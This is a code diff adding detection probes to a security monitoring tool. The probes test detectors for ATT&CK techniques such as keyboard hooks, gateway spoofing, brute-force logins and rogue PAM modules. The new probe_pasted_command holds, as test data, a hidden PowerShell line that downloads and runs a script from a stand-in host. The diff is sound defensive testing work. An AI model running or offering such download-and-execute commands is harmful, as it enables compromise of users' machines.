@@ -199,7 +199,7 @@ def _technique_probe(tid):
             rules.sort(key=lambda r: ("critical", "high", "medium", "low").index(r.severity))
             if rules:
                 rule = rules[0]
-                fired &= _reports(_replay(platform, [rule.sample]), tid)
+                fired &= _reports(_replay(platform, [rule.sample], rule.sample_parent), tid)
                 checked.append(f"{platform}: {rule.title}")
             elif tid in techniques.DISCOVERY_SAMPLES[platform]:
                 samples = techniques.DISCOVERY_SAMPLES[platform]
@@ -283,6 +283,201 @@ def probe_reflective_image():
                for f in out), "executable PE image in private memory with no backing file"
 
 
+def probe_pasted_command():
+    from jarvis.collectors.host.intrusion import history
+    lure = "powershell -w hidden -c \"iwr https://cdn-verify.example/c.txt | iex\""
+    out = history._history_findings({"psHistory": [lure, "Get-ChildItem"], "psHistoryPath": "h"})
+    # A vendor's own installer line has the same shape and must stay low.
+    vendor = history._history_findings(
+        {"psHistory": ["irm https://astral.sh/uv/install.ps1 | iex"], "psHistoryPath": "h"})
+    return (any(f["severity"] == "high" and f["category"] == "clickfix" for f in out)
+            and all(f["severity"] in ("low", "ok") for f in vendor)), \
+        "download-and-run lure pasted into PowerShell; a vendor installer line stays low"
+
+
+def probe_keyboard_hook():
+    from jarvis.collectors.host.inputwatch import watchers
+    row = {"kind": "hook", "type": 13, "pid": 4242, "start": "1", "first": 1767225600,
+           "path": r"C:\Users\x\AppData\Roaming\svc\helper.exe", "sig": "NotSigned",
+           "visible_windows": 0}
+    signed = dict(row, path=r"C:\Program Files\Vendor\ptt.exe", sig="Valid", signer="Vendor")
+    out = watchers.audit(result=({"watchers": [row, signed]}, ""), clock=1767225700)
+    high = [f for f in out if f["severity"] == "high"]
+    return (len(high) == 1 and "watching every keyboard event" in high[0]["title"]), \
+        "unsigned process with a low-level keyboard hook; a signed one stays low"
+
+
+def _network_events(change):
+    """Events netwatch records when one field of a steady connection changes."""
+    import importlib
+
+    from jarvis.core.store import Store
+    # The package re-exports the function under the module's own name.
+    record = importlib.import_module("jarvis.collectors.network.netwatch.record")
+    base = {"ts": 1767225600, "iface": "Wi-Fi", "state": "connected", "ssid": "home",
+            "bssid": "aa:aa:aa:aa:aa:01", "channel": "6", "band": "5 GHz",
+            "auth": "WPA3-Personal", "cipher": "CCMP", "signal": 80, "ipv4": "192.0.2.10",
+            "gateway": "192.0.2.1", "gw_mac": "aa:aa:aa:aa:aa:fe", "dns": "192.0.2.1"}
+    with tempfile.TemporaryDirectory() as tmp:
+        store = Store(os.path.join(tmp, "probe.db"))
+        try:
+            record.record(store, dict(base))
+            steady = record.record(store, dict(base, ts=base["ts"] + 300))
+            events = record.record(store, dict(base, ts=base["ts"] + 600, **change))
+        finally:
+            store.close()
+    return {e["kind"]: e["severity"] for e in events}, steady
+
+
+def probe_gateway_spoof():
+    events, steady = _network_events({"gw_mac": "de:ad:be:ef:00:01", "dns": "203.0.113.53"})
+    return (events.get("gateway-changed") == "high" and events.get("dns-changed") == "high"
+            and not steady), \
+        "default gateway answering from a new MAC and a changed resolver; no event while steady"
+
+
+def probe_crypto_downgrade():
+    events, steady = _network_events({"auth": "Open"})
+    return events.get("crypto-downgrade") == "critical" and not steady, \
+        "Wi-Fi encryption on the same network weakened from WPA3 to open"
+
+
+def probe_login_guessing():
+    from jarvis.collectors.identity import bruteforce
+    guess = [f"sshd[9]: Failed password for invalid user u{i} from 203.0.113.9 port 4{i:04d} ssh2"
+             for i in range(bruteforce.SPIKE_ONE_SOURCE)]
+    out = bruteforce._linux(lines=guess)
+    quiet = bruteforce._linux(lines=guess[:3])
+    return (any(f["severity"] == "high" for f in out)
+            and all(f["severity"] == "ok" for f in quiet)), \
+        "a failed-login spike from one source; three failures stay quiet"
+
+
+def _remote_logon(logon):
+    from jarvis.collectors.network import firewall
+    out = firewall.audit_windows(data={"profiles": [], "secReadable": True, "logons": [logon]})
+    return [f for f in out if f["category"] == "access" and "logon succeeded" in f["title"]]
+
+
+def probe_remote_logon():
+    hit = _remote_logon({"type": "3", "user": "alice", "ip": "203.0.113.9", "time": _WHEN})
+    return (bool(hit) and hit[0]["severity"] in ("high", "critical")
+            and not _remote_logon_none()), \
+        "successful network logon with a real account from another machine; none, no finding"
+
+
+def probe_external_rdp():
+    hit = _remote_logon({"type": "10", "user": "alice", "ip": "203.0.113.9", "time": _WHEN})
+    return (bool(hit) and "RDP" in hit[0]["title"]
+            and hit[0]["severity"] in ("high", "critical")), \
+        "successful RDP logon from another machine"
+
+
+def _remote_logon_none():
+    from jarvis.collectors.network import firewall
+    out = firewall.audit_windows(data={"profiles": [], "secReadable": True, "logons": []})
+    return [f for f in out if "logon succeeded" in f["title"]]
+
+
+def probe_rogue_pam_module():
+    from jarvis.collectors.persistence import implant
+    with tempfile.TemporaryDirectory() as tmp:
+        open(os.path.join(tmp, "pam_audit_helper.so"), "wb").close()
+        open(os.path.join(tmp, "README"), "wb").close()
+        out = implant.unowned_pam_modules(dirs=(tmp,))
+    return (len(out) == 1 and out[0]["severity"] == "critical"
+            and "pam_audit_helper.so" in out[0]["title"]), \
+        "an authentication module that no installed package owns"
+
+
+def probe_forced_authentication():
+    from jarvis.collectors.telemetry import sysmon
+    def smb(dest, initiated=True):
+        return sysmon.audit(events=[{"id": 3, "image": r"C:\Windows\explorer.exe", "dest": dest,
+                                     "dport": "445", "initiated": initiated, "time": _WHEN}])
+    return (_reports(smb("8.8.4.4"), "T1187") and not _reports(smb("192.168.1.20"), "T1187")
+            and not _reports(smb("8.8.4.4", initiated=False), "T1187")), \
+        "outbound file-share connection to a public address; a LAN share and an inbound one are quiet"
+
+
+def probe_generated_domains():
+    from jarvis.collectors.telemetry import sysmon, techniques
+    def lookups(n, status):
+        return sysmon.audit(events=[
+            {"id": 22, "image": r"C:\Users\x\AppData\Local\Temp\a.exe", "process_guid": "{9}",
+             "query": f"q{i:02d}xkzvw{i * 7919 % 97}.example", "dns_status": status, "time": _WHEN}
+            for i in range(n)])
+    return (_reports(lookups(techniques.DGA_NAMES, techniques.NXDOMAIN), "T1568")
+            and not _reports(lookups(techniques.DGA_NAMES - 1, techniques.NXDOMAIN), "T1568")
+            and not _reports(lookups(techniques.DGA_NAMES * 2, "9701"), "T1568")), \
+        "one process resolving many non-existent names; fewer, or names that merely lack a record, are quiet"
+
+
+def _evasion(**payload):
+    from jarvis.collectors.process import evasion
+    return evasion.audit(data={"drivers": [], "dns": [], **payload})
+
+
+def probe_vulnerable_driver():
+    out = _evasion(drivers=[{"name": "RTCore64", "start": "demand",
+                             "path": r"C:\Users\x\AppData\Local\Temp\RTCore64.sys"}])
+    loaded = any(f["category"] == "byovd" and f["severity"] in ("critical", "high")
+                 and "driver" in f["title"] for f in out)
+    clean = _evasion(drivers=[{"name": "disk", "start": "boot",
+                               "path": r"C:\Windows\System32\drivers\disk.sys"}])
+    quiet = not any(f["category"] == "byovd" and f["severity"] in ("critical", "high")
+                    and "driver" in f["title"] and "blocklist" not in f["title"] for f in clean)
+    rule, what = _technique_probe("T1068")()
+    return loaded and quiet and rule, ("exploitable or staged kernel driver loaded; " + what
+                                       + " (the after-effect is seen, not the exploit)")
+
+
+def probe_dead_drop():
+    out = _evasion(dns=["api.telegram.org", "www.example.org"])
+    hits = [f for f in out if f["category"] == "c2" and f["severity"] == "high"]
+    clean = [f for f in _evasion(dns=["www.example.org"]) if f["category"] == "c2"]
+    return (len(hits) == 1 and "api.telegram.org" in hits[0]["detail"]
+            and all(f["severity"] == "ok" for f in clean)), \
+        "a chat-bot or paste service used as a command channel was resolved"
+
+
+def probe_browser_debugging():
+    from jarvis.collectors.network import internetwatch
+    app = {"pid": 4242, "name": "chrome.exe", "exe": r"C:\Program Files\Google\Chrome\chrome.exe"}
+    def flags(found):
+        out, _rows = internetwatch.analyze("win", {"apps": [dict(app, flags=found)],
+                                                   "connections": []}, None)
+        return [f for f in out if "security bypass flag" in f.get("title", "")]
+    return len(flags(["--remote-debugging-port"])) == 1 and not flags([]), \
+        "browser started with a remote-debugging port, which lets another program drive its sessions"
+
+
+def probe_registry_redirect():
+    from jarvis.collectors.host.toolchain import packaging
+    with tempfile.TemporaryDirectory() as home:
+        clean = packaging.registry_redirects(home=home)
+        with open(os.path.join(home, ".npmrc"), "w") as fh:
+            fh.write("registry=https://registry.npmjs.org/\n")
+        default = packaging.registry_redirects(home=home)
+        with open(os.path.join(home, ".npmrc"), "w") as fh:
+            fh.write("registry=https://npm.mirror.example/\n")
+        out = packaging.registry_redirects(home=home)
+    return (len(out) == 1 and out[0]["severity"] == "high" and not clean and not default), \
+        "package installs redirected to a non-default registry; the default one is quiet"
+
+
+def probe_hardware_addition():
+    from jarvis.collectors.host import bootintegrity
+    base = {"firmware": "1.0", "option_roms": ["a" * 64], "boot_apps": [], "authorities": [],
+            "variables": {}, "pcrs": {"2": "2" * 64}}
+    same = bootintegrity.drift(base, dict(base), "probe")
+    added = bootintegrity.drift(base, dict(base, option_roms=["a" * 64, "b" * 64],
+                                           pcrs={"2": "9" * 64}), "probe")
+    return (not same and any("option ROM" in f["title"] and f["severity"] == "high"
+                             for f in added)), \
+        "code from a newly attached card or device ran before the operating system"
+
+
 def probe_technique_lookalikes():
     """No benign look-alike in the rule table may fire through the detectors."""
     from jarvis.collectors.telemetry import techniques
@@ -321,11 +516,63 @@ PROBES = {
 # A probe exists only where its detector does: a release without the in-memory
 # image classifier has nothing to prove, and the technique keeps its mapped
 # (claimed) level instead of reading as a regression.
-try:
-    from jarvis.collectors.process import assemblies as _assemblies  # noqa: F401
-    PROBES["T1620"] = (probe_reflective_image, ("memscan",))
-except ImportError:
-    pass
+def _optional(tid, probe, jobs, ready):
+    """Register a probe only when `ready()` says its detector can run here."""
+    try:
+        if ready():
+            PROBES[tid] = (probe, jobs)
+    except Exception:
+        pass
+
+
+def _params(module, function):
+    import importlib
+    import inspect
+    return inspect.signature(getattr(importlib.import_module(module), function)).parameters
+
+
+def _has(module, name=None):
+    import importlib
+    found = importlib.import_module(module)
+    return name is None or hasattr(found, name)
+
+
+_optional("T1620", probe_reflective_image, ("memscan",),
+          lambda: _has("jarvis.collectors.process.assemblies"))
+_optional("T1204", probe_pasted_command, ("intrusion",),
+          lambda: _has("jarvis.collectors.host.intrusion.history", "_history_findings"))
+_optional("T1056", probe_keyboard_hook, ("input",),
+          lambda: _has("jarvis.collectors.host.inputwatch.watchers", "audit"))
+_optional("T1557", probe_gateway_spoof, ("netwatch",),
+          lambda: _has("jarvis.collectors.network.netwatch.record", "record"))
+_optional("T1689", probe_crypto_downgrade, ("netwatch",),
+          lambda: _has("jarvis.collectors.network.netwatch.record", "record"))
+# The seams these three need (`lines=`, `data=`, `dirs=`) arrived with the
+# probes; an older collector without them has nothing a probe can call.
+_optional("T1110", probe_login_guessing, ("bruteforce",),
+          lambda: "lines" in _params("jarvis.collectors.identity.bruteforce", "_linux"))
+_optional("T1078", probe_remote_logon, ("firewall",),
+          lambda: "data" in _params("jarvis.collectors.network.firewall", "audit_windows"))
+_optional("T1133", probe_external_rdp, ("firewall",),
+          lambda: "data" in _params("jarvis.collectors.network.firewall", "audit_windows"))
+_optional("T1187", probe_forced_authentication, ("sysmon",),
+          lambda: _has("jarvis.collectors.telemetry.techniques", "outbound_smb"))
+_optional("T1568", probe_generated_domains, ("sysmon",),
+          lambda: _has("jarvis.collectors.telemetry.techniques", "dga_bursts"))
+_optional("T1068", probe_vulnerable_driver, ("evasion", "sysmon"),
+          lambda: "data" in _params("jarvis.collectors.process.evasion", "audit"))
+_optional("T1102", probe_dead_drop, ("evasion",),
+          lambda: "data" in _params("jarvis.collectors.process.evasion", "audit"))
+_optional("T1185", probe_browser_debugging, ("internet",),
+          lambda: _has("jarvis.collectors.network.internetwatch", "analyze"))
+_optional("T1195", probe_registry_redirect, ("toolchain",),
+          lambda: _has("jarvis.collectors.host.toolchain.packaging", "registry_redirects"))
+_optional("T1200", probe_hardware_addition, ("preos",),
+          lambda: _has("jarvis.collectors.host.bootintegrity", "drift"))
+# Package ownership is asked of dpkg; without it every module reads unowned.
+_optional("T1556", probe_rogue_pam_module, ("implant",),
+          lambda: _has("jarvis.collectors.persistence.implant", "unowned_pam_modules")
+          and bool(__import__("shutil").which("dpkg")))
 # Techniques whose only detection is contextual: a discovery command is
 # reported inside a burst and deliberately not alone, so a single `whoami` by
 # an intruder goes unreported. Their probes still run (a broken burst rule is a
@@ -346,6 +593,17 @@ try:
     PROBES = {**_table_probes(), **PROBES}
 except Exception:       # pragma: no cover - surfaced by the map's own totals
     pass
+
+# Why a technique whose probe fires is still only claimed. Burst-only discovery
+# is filled in below; the rest are judgments recorded here.
+HELD = {tid: "reported only as part of a burst of discovery commands, never by itself"
+        for tid in CONTEXT_ONLY}
+# A successful remote logon is recorded and shown, but one made with stolen
+# credentials is indistinguishable from the owner's: the event is seen, the
+# abuse is not.
+HELD["T1078"] = ("every successful remote logon is reported, but a stolen credential "
+                 "looks the same as the owner's")
+CONTEXT_ONLY = frozenset(HELD)
 # Precision probes guard against false-positive regressions; not a technique.
 PRECISION = {"popular-domain filter": probe_popular_domain_not_flagged,
              "technique rule look-alikes": probe_technique_lookalikes}
@@ -389,6 +647,18 @@ def measure(store):
             out.append(_finding("coverage", "high", f"false-positive guard regressed: {label}",
                                 f"{what} — expected no match", "attackmap"))
 
+    # A mapping to a technique ATT&CK has retired or split counts for nothing
+    # and hides that its successors are unmapped (T1562 became T1685-T1690).
+    known = {r["tid"] for r in catalogue}
+    orphaned = sorted(t for t in set(PROBES) | {k for k in COVERAGE if "." not in k}
+                      if known and t not in known)
+    if orphaned:
+        out.append(_finding(
+            "coverage", "low", "coverage is mapped to techniques ATT&CK no longer lists",
+            f"{', '.join(orphaned)}: retired, renamed or split upstream, so these mappings "
+            f"cover nothing in the current catalogue. Map their successors on their own "
+            f"evidence, or remove them.", "attackmap"))
+
     seen = {t for r in techniques for t in (r["tactics"] or "").split(",") if t}
     order = [t for t in TACTIC_ORDER if t in seen] + sorted(seen - set(TACTIC_ORDER))
     rows, tactics = [], {t: {"validated": 0, "claimed": 0, "blind": 0, "regressed": 0, "total": 0}
@@ -401,8 +671,7 @@ def measure(store):
                 level, evidence = "regressed", what
             elif tid in CONTEXT_ONLY:
                 level, evidence = "claimed", (
-                    f"{what}; reported only as part of a burst of discovery commands, "
-                    f"never by itself" + ("" if live else f"; {', '.join(jobs)} not reporting"))
+                    f"{what}; {HELD[tid]}" + ("" if live else f"; {', '.join(jobs)} not reporting"))
             elif live:
                 level, evidence = "validated", f"{what}; live via {', '.join(live)}"
             else:
